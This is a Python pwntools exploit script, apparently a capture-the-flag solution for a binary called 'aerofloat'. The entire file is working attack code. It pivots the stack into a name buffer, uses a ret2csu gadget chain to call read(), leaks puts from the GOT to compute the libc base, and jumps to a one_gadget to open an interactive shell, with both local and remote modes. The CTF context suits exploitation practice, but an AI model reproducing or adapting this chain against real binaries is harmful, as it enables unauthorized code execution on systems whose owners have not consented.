from pwn import *
import struct

local = 1

if local == 1 : 
    p = process("./aerofloat")
    puts_offset = 0x809c0
    one = [0x4f2c5,0x4f322,0x10a38c]
    
else :
    p = remote("")
    puts_offset = 0x74050 
    
puts_plt = 0x401030
puts_got = 0x404018
read_got = 0x404030

pr = 0x4015bb #pop rdi ; ret
leave = 0x4013ed # leave ; ret

name = 0x4040C0
csu1 = 0x4015B2
csu2 = 0x401598


def rate(tid,rate) : 
    p.sendlineafter(">",str(1))
    p.sendlineafter("id:",tid)
    p.sendlineafter("rating:",str(rate))

def dh(s):
    return struct.unpack('!d',("0"*10+hex(s)[2:]).decode('hex'))[0]

def ex() : 
    p.sendlineafter(">",str(4))

if __name__ == "__main__" :
    
    main = 0x4011C4
    d_main = dh(main)
    
    payload = p64(name+0x16)
    payload += p64(csu1)
    #rbx -> 0, rbp->1, r12->edi , r13->rsi, r14->rdx, r15->read got 
    payload += p64(0) + p64(1) + p64(0) + p64(name+0x80) + p64(0x30)
    payload += p64(read_got)
    payload += p64(csu2)
    
    p.sendlineafter("name:",payload)
    for i in range(0,11):
        rate("11",0xbb)
    
    rate("3333"+p32(11),11)
    rate(p64(name),dh(pr))
    
    rate(p64(puts_got),dh(puts_plt))
    rate(p64(leave),11)
    pause()
    ex()
    p.recvuntil("Exit")
    p.recvline()
    
    leak = u64(p.recvline()[2:-1]+"\x00"*2)
    libc = leak-puts_offset
    one_gadget = libc+one[1]
    log.info(hex(libc))
    log.info(hex(one_gadget))

    payload2 = p64(one_gadget)
    p.sendline(payload2)
    

    p.sendline()
    p.interactive()
    